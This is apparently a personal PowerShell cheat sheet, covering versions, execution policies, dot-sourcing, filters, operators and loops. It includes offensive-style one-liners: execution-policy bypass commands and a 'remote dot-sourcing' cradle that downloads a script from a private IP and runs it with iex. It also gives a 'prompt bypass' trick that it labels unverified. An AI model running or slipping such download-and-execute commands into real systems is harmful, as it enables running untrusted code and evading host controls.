## Windows Powershell

### Versions

- Windows Powershell 5.0 runs on these versions of Windows:
  - Windows Server 2016, installed by default
  - Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 with Service Pack 1/Windows 8.1/Windows 7 with Service Pack 1 (install Windows Management Framework 5.0 to run it)  
- Windows Powershell 4.0 runs on these versions of Windows:
  - Windows 8.1/Windows Server 2012 R2, installed by default
  - Windows 7 with Service Pack 1/Windows Server 2008 R2 with Service Pack 1 (install Windows Management Framework 4.0 to run it)  
- Windows Powershell 3.0 runs on these versions of Windows:
  - Windows 8/Windows Server 2012, installed by default
  - Windows 7 with Service Pack 1/Windows Server 2008 R2 with Service Pack 1/2 (install Windows Management Framework 3.0 to run it)  

### Prompt Bypass

This is not verified, but if you have a command that prompts you at an non-interactive shell, try adding this to the end of it:

```powershell
COMMAND | echo $shell.sendkeys("Y`r`n")
```

### PowerShell ISE

PowerShell contains a built-in Integrated Development Environment (IDE), known as the Windows PowerShell Integrated Scripting Environment (ISE). The ISE is a host application for Windows 
PowerShell that enables us to run commands, write, test, and debug scripts in a single Windows-based graphical user interface.  

### Execution Policies

Controls what can load or run on the system

- 'restricted' (Default) - system will neither load PS config files or run PS scripts

- 'unrestricted' - allows loading and running anything

```powershell
# Checks the current policy
Get-ExecutionPolicy
# Checks the current policy for the Current User
Get-ExecutionPolicy -scope currentuser
```

If it doesn't show 'Unrestricted', this will stop the script from running.  There are different ways to fix this:

1. Modify the policy for the system (Requires Admin)

   ```powershell
   # Sets the current policy (requires admin prompt)
   Set-ExecutionPolicy Unrestricted -force
   ```

2. Modify the policy for the user:

   ```powershell
   Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -force
   ```

3. Bypass the policy per script

   ```powershell
   # This is run from PowerShell, not Command Prompt
   powershell -ExecutionPolicy Bypass -force -File .\script.ps1
   ```

More ways:  https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/

### Dot-Sourcing (Loading a script)

This PowerShell feature allows one to load a script and make all variables and functions declared in the script available in the current PowerShell scope (generally the current instance).  A Dot-Sourced script allows the user access to the functions of a script directly from the CLI rather than having to execute the script over and over.

#### Local Dot-Sourcing

```powershell
. .\script.ps1
```

#### Remote Dot-Sourcing

```powershell
iex (New-Object System.Net.WebClient).DownloadString('https://192.168.119.216/myscript.ps1')
```

### Command Filters

```powershell
# These are filters that output can be piped into, they are largeley dependent on the output being piped to them, as far as what property identifiers you will use.

Select-Object Name, State, PathName		# Selects columns to show
Where-Object {$_.State -like 'Running'}	# Filters by running processes

# Extra Options
Where-Object {$_.Name -like 'Serviio'}	# Match by friendly name
Where-Object {$_.Name -Match "^Ser.*"} # Match by name using a regular expression
Where-Object {$_.ProcessName -like 'Serviio'} # Match by process name
```

### Comparison Operators

Comparison operators are in the form of 

```powershell
( L.VALUE OPERATOR R.VALUE)
```

| Operator | Description                                                  |
| -------- | ------------------------------------------------------------ |
| -eq      | equals                                                       |
| -ne      | not equal                                                    |
| -gt, -ge | greater than, greater than or equal to                       |
| -lt, -le | less than, less than or equal to                             |
| -like    | wildcard match.  <br />? matches a single character, * matches any numer of characters |
| -match   | Regular expression match                                     |



### If Statements

```powershell
# Example
$x = 30

if($x -le 20){
   write-host("This is if statement")
}else {
   write-host("This is else statement")
}
```



### Loops

#### Foreach

```powershell
Foreach($obj in $Result)
{
	Foreach($prop in $obj.Properties)
	{
		$prop
	}
	
	Write-Host "-------------------------"
}
```

### Functions

```powershell
function NestMembers([InputVarType] $InputVarName){
	#Statements here
}
```

